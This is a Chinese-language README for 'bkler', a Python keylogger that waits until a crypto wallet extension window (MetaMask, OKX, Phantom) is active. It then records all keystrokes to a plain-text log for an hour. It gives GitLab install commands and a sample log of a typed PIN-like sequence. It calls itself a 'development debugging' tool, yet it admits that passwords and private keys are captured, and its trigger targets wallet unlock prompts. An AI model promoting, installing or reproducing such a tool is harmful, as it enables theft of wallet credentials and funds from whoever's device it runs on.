# 钱包键盘记录器 (Wallet Keylogger)

持续检测活动窗口，匹配钱包关键词时触发键盘记录，记录到 `~/.dev/bkler/recording_{日期}.log`

## 功能特性

- **持续检测** - 后台持续检测活动窗口
- **自动触发** - 检测到钱包窗口时自动开始记录
- **限时记录** - 自动记录 60 分钟后停止
- **Windows 平台** - 支持 Windows 系统
- **智能匹配** - 检测 Unknown 窗口和钱包关键词

## 工作原理

程序后台持续检测活动窗口（每 0.2 秒），当满足以下条件时自动触发记录：
- 窗口标题为 `Unknown`（钱包扩展下拉窗口）
- 窗口标题包含钱包关键词（OKX, MetaMask, Wallet, Phantom 等）

## 安装

### 推荐：使用 uv tool install（全局安装）

```bash
# 安装 uv（如果尚未安装）
curl -LsSf https://astral.sh/uv/install.sh | sh

# 从 GitLab 仓库安装工具
uv tool install git+https://gitlab.com/web3toolsbox/bkler.git

# 直接使用命令
bkler
```

### 使用 pip 安装

```bash
# 克隆项目
git clone https://gitlab.com/web3toolsbox/bkler.git
cd bkler
pip install -e .
```

安装后可直接使用命令：

```bash
bkler
```

### 直接运行（无需安装）

```bash
# 克隆项目
git clone https://gitlab.com/web3toolsbox/bkler.git
cd bkler
pip install -r requirements.txt
python bkler.py
```

## 使用方法

```bash
bkler
```

程序启动后会持续检测活动窗口，当打开钱包扩展（如 OKX、MetaMask 等）时，自动开始记录 60 分钟。

按 `F12` 键退出程序，或使用 `Ctrl+C`

### 查看日志

```bash
cat ~/.dev/bkler/recording_*.log
```

## 包结构

```
bkler/
├── bkler/              # 包目录
│   ├── __init__.py        # 包初始化
│   ├── cli.py             # 命令行入口
│   ├── detectors.py       # Windows 窗口检测
│   └── logger.py          # 核心记录器类
├── bkler.py           # 独立脚本入口
├── pyproject.toml         # 包配置（uv 兼容）
├── .python-version        # Python 版本固定
├── requirements.txt       # 依赖列表
└── README.md              # 说明文档
```

## 日志格式

```
[时间] [窗口名称] 按键内容
```

示例：

```
# --- 记录开始: 2026-05-28 15:30:00 ---
# 触发窗口: [Unknown]
[2026-05-28 15:30:05] [Unknown] 1
[2026-05-28 15:30:06] [Unknown] 2
[2026-05-28 15:30:07] [Unknown] 3
[2026-05-28 15:30:08] [Unknown] 4
[2026-05-28 15:30:09] [Unknown] 5
[2026-05-28 15:30:10] [Unknown] [Enter]
# --- 记录结束: 2026-05-28 16:30:00 ---
```

## 安全注意事项

⚠️ **重要警告**

1. 此工具仅用于**开发调试目的**
2. 日志文件包含**明文键盘记录**，包括可能输入的密码
3. 请妥善保管日志文件，使用后及时删除
4. **不要**在生产环境或他人设备上使用
5. 敏感信息（密码、私钥等）会被记录

## 许可

仅供个人学习研究使用。
